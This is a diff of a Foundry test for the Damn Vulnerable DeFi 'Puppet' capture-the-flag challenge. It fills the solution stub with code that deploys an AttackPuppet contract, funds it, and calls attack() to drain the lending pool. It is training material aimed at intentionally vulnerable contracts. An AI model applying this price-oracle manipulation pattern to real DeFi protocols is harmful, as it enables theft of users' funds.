@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {AttackPuppet} from "./AttackPuppet.sol";
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,7 +93,14 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // cmd : forge test --match-contract PuppetChallenge --match-test test_puppet
+        //! copied
+        AttackPuppet attack = new AttackPuppet(lendingPool, token, uniswapV1Exchange, recovery);
+        (bool success,) = address(attack).call{value: player.balance}("");
+        require(success, "Eth transfer failed");
+        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
+        attack.attack(POOL_INITIAL_TOKEN_BALANCE);
+        // attack.myAttack(POOL_INITIAL_TOKEN_BALANCE);
     }
 
     // Utility function to calculate Uniswap prices
